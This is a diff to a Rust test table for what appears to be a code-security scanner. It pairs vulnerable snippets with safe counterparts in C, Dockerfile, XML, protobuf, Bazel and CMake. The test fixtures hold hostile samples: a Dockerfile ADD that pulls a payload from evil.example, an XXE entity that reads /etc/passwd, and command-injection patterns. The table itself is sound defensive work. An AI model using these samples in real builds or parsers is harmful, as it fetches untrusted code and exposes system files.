@@ -209,6 +209,103 @@ data:
         must_intercept: false,
         desc_fragment: None,
     },
+    Entry {
+        name: "C/system(dynamic) — INTERCEPT",
+        lang: "c",
+        source: b"#include <stdlib.h>\nvoid f(char *cmd) { system(cmd); }\n",
+        must_intercept: true,
+        desc_fragment: Some("os_command_injection"),
+    },
+    Entry {
+        name: "C/system(literal) — SAFE",
+        lang: "c",
+        source: b"#include <stdlib.h>\nvoid f() { system(\"/usr/bin/id\"); }\n",
+        must_intercept: false,
+        desc_fragment: None,
+    },
+
+    // ── Dockerfile remote fetch ────────────────────────────────────────────
+    Entry {
+        name: "Dockerfile/remote ADD — INTERCEPT",
+        lang: "dockerfile",
+        source: b"FROM alpine:3.20\nADD https://evil.example/payload.tgz /opt/payload.tgz\n",
+        must_intercept: true,
+        desc_fragment: Some("docker_remote_add"),
+    },
+    Entry {
+        name: "Dockerfile/local COPY — SAFE",
+        lang: "dockerfile",
+        source: b"FROM alpine:3.20\nCOPY ./payload.tgz /opt/payload.tgz\n",
+        must_intercept: false,
+        desc_fragment: None,
+    },
+
+    // ── XML XXE ────────────────────────────────────────────────────────────
+    Entry {
+        name: "XML/external entity SYSTEM — INTERCEPT",
+        lang: "xml",
+        source: br#"<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<foo>&xxe;</foo>
+"#,
+        must_intercept: true,
+        desc_fragment: Some("xml_xxe"),
+    },
+    Entry {
+        name: "XML/plain document — SAFE",
+        lang: "xml",
+        source: br#"<?xml version="1.0"?><foo>safe</foo>"#,
+        must_intercept: false,
+        desc_fragment: None,
+    },
+
+    // ── Proto type erasure ────────────────────────────────────────────────
+    Entry {
+        name: "Proto/google.protobuf.Any — INTERCEPT",
+        lang: "proto",
+        source: b"syntax = \"proto3\";\nimport \"google/protobuf/any.proto\";\nmessage Envelope { google.protobuf.Any payload = 1; }\n",
+        must_intercept: true,
+        desc_fragment: Some("proto_type_erasure"),
+    },
+    Entry {
+        name: "Proto/typed message field — SAFE",
+        lang: "proto",
+        source: b"syntax = \"proto3\";\nmessage Payload { string value = 1; }\nmessage Envelope { Payload payload = 1; }\n",
+        must_intercept: false,
+        desc_fragment: None,
+    },
+
+    // ── Bazel/Starlark unpinned remote fetch ──────────────────────────────
+    Entry {
+        name: "Starlark/http_archive without sha256 — INTERCEPT",
+        lang: "bzl",
+        source: b"http_archive(\n    name = \"rules_foo\",\n    urls = [\"https://example.com/rules_foo.tar.gz\"],\n)\n",
+        must_intercept: true,
+        desc_fragment: Some("bazel_unpinned_http_archive"),
+    },
+    Entry {
+        name: "Starlark/http_archive pinned — SAFE",
+        lang: "bzl",
+        source: b"http_archive(\n    name = \"rules_foo\",\n    urls = [\"https://example.com/rules_foo.tar.gz\"],\n    sha256 = \"abc123\",\n)\n",
+        must_intercept: false,
+        desc_fragment: None,
+    },
+
+    // ── CMake command interpolation ───────────────────────────────────────
+    Entry {
+        name: "CMake/execute_process variable command — INTERCEPT",
+        lang: "cmake",
+        source: b"set(USER_CMD ${ENV{PAYLOAD}})\nexecute_process(COMMAND ${USER_CMD} OUTPUT_VARIABLE out)\n",
+        must_intercept: true,
+        desc_fragment: Some("cmake_execute_process_injection"),
+    },
+    Entry {
+        name: "CMake/execute_process literal command — SAFE",
+        lang: "cmake",
+        source: b"execute_process(COMMAND /usr/bin/git rev-parse HEAD OUTPUT_VARIABLE out)\n",
+        must_intercept: false,
+        desc_fragment: None,
+    },
 
     // ── HCL/Terraform ────────────────────────────────────────────────────
     Entry {
